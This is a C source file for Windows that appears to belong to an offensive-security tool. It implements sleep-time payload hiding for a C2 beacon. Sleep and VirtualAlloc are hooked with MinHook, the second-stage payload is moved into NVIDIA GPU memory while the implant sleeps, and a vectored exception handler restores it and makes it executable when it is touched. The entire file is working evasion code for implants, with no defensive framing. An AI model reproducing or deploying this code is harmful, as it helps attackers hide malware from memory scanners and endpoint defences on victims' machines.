#include <Windows.h>
#include <stdio.h>
#include "Common.h"
#include "GpuMemoryAbuse.h"
#include "MinHook.h"
#pragma comment(lib, "minhook.x64.lib")

//------------------------------------------------------------------------------------------------------------------------------------------------------------------------//
// struct to hold the 2nd stage payload
struct BeaconConfig {

	LPVOID		Stage2Address;	//where will it land
	SIZE_T		Stage2Size;		//size of the 2nd stage
	
	ULONG_PTR	storageGPU;		//gpu address of where we will save the payload
};
struct BeaconConfig Conf = { 0 };

//------------------------------------------------------------------------------------------------------------------------------------------------------------------------//

// the hooked functions:
typedef VOID	(WINAPI* SLEEP) (DWORD);
typedef LPVOID	(WINAPI* VIRTUALALLOC) (LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);

// keep a global variable unhooked
SLEEP fnSleep = NULL;
VIRTUALALLOC fnVirtualAlloc = NULL;

//------------------------------------------------------------------------------------------------------------------------------------------------------------------------//

// function pre-definition
VOID WINAPI MySleep(DWORD dwMilliseconds);
LPVOID WINAPI MyVirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
LONG NTAPI VEHHandler(PEXCEPTION_POINTERS pExceptInfo);

//------------------------------------------------------------------------------------------------------------------------------------------------------------------------//

// function to install hooks and run the veh exception handler and get us started with the gpu
BOOL InitializeMemToGpu() {
	if (!InitNvidiaCudaAPITable(&Api)) {
		printf("[-] InitNvidiaCudaAPITable failed ... \n");
		return FALSE;
	}
	if (!InitAPITable2()){
		printf("[-] InitAPITable2 failed ... \n");
		return FALSE;
	}

	fnSleep = Sleep;
	fnVirtualAlloc = VirtualAlloc;
	AddVectoredExceptionHandler(1, &VEHHandler);

	if (MH_Initialize() != MH_OK) {
		printf("[-] MH_Initialize failed... \n");
		return FALSE;
	}
	if (MH_CreateHook(&Sleep, &MySleep, &fnSleep) != MH_OK) {
		printf("[-] MH_CreateHook[1] failed... \n");
		return FALSE;
	}
	if (MH_CreateHook(&VirtualAlloc, &MyVirtualAlloc, &fnVirtualAlloc) != MH_OK) {
		printf("[-] MH_CreateHook [2] failed... \n");
		return FALSE;
	}
	if (MH_EnableHook(&Sleep) != MH_OK) {
		printf("[-] MH_EnableHook [1] failed... \n");
		return FALSE;
	}
	if (MH_EnableHook(&VirtualAlloc) != MH_OK) {
		printf("[-] MH_EnableHook [2] failed... \n");
		return FALSE;
	}
	return TRUE;
}

//------------------------------------------------------------------------------------------------------------------------------------------------------------------------//
// the function replacing Sleep
VOID WINAPI MySleep(DWORD dwMilliseconds) {
	printf("[i] Sleeping for : %d\n", (unsigned int) dwMilliseconds);
	DWORD Old;
	
	if (dwMilliseconds >= 400) { // interactive + jitter, idk its up to you
		Conf.storageGPU = ToGPU(Conf.Stage2Address, Conf.Stage2Size, &Api);
		if (!VirtualProtect(Conf.Stage2Address, Conf.Stage2Size, PAGE_READONLY, &Old)) {
			printf("[-] VirtualProtect [RO] failed with error: %d \n", GetLastError());
		}
	}
	
	fnSleep(dwMilliseconds);
}
//------------------------------------------------------------------------------------------------------------------------------------------------------------------------//

// function replacing VirtualAlloc
LPVOID WINAPI MyVirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) {
	DWORD Old;
	LPVOID Stage2Address = fnVirtualAlloc(NULL, dwSize, flAllocationType, PAGE_READWRITE); // better than rwx allocation all at once 
	
	if (Stage2Address != NULL && dwSize != NULL){
		VirtualProtect(Stage2Address, dwSize, PAGE_EXECUTE_READWRITE, &Old);
	}
	Conf.Stage2Address = Stage2Address;
	Conf.Stage2Size = dwSize;
	printf("[+] Landed 2nd Stage [%d] At : 0x%p \n", (unsigned int) Conf.Stage2Size, Conf.Stage2Address);
	// unhooking
	if (MH_DisableHook(&VirtualAlloc) != MH_OK) {
		printf("[-] MH_DisableHook failed... \n");
	}

	return Stage2Address;
}

//------------------------------------------------------------------------------------------------------------------------------------------------------------------------//
// the veh exception handler
LONG NTAPI VEHHandler(PEXCEPTION_POINTERS pExceptInfo) {

	ULONG_PTR ExptnAddress = pExceptInfo->ContextRecord->Rip;
	DWORD Old;

	if (pExceptInfo->ExceptionRecord->ExceptionCode == EXCEPTION_ACCESS_VIOLATION) {
		if (ExptnAddress >= (ULONG_PTR)Conf.Stage2Address && ExptnAddress <= (ULONG_PTR)((ULONG_PTR)Conf.Stage2Address + Conf.Stage2Size)) {
			if (!VirtualProtect(Conf.Stage2Address, Conf.Stage2Size, PAGE_EXECUTE_READWRITE, &Old)) {
				printf("[-] VirtualProtect [RWX] failed with error: %d \n", GetLastError());
			}
			ToMem(Conf.Stage2Address, Conf.Stage2Size, Conf.storageGPU, &Api);
			return EXCEPTION_CONTINUE_EXECUTION;
		}
		else {
			printf("[!] Exception Address Is From Un-Monitored Memory; 0x%0-16p \n", (void*)ExptnAddress);
		}

	}
	else {
		printf("[!] The EXCEPTION at [ 0x%p ] isnt ACCESS_VIOLATION; 0x%0-8X \n", (void*)pExceptInfo->ContextRecord->Rip, pExceptInfo->ExceptionRecord->ExceptionCode);
	}

	return EXCEPTION_CONTINUE_SEARCH;
}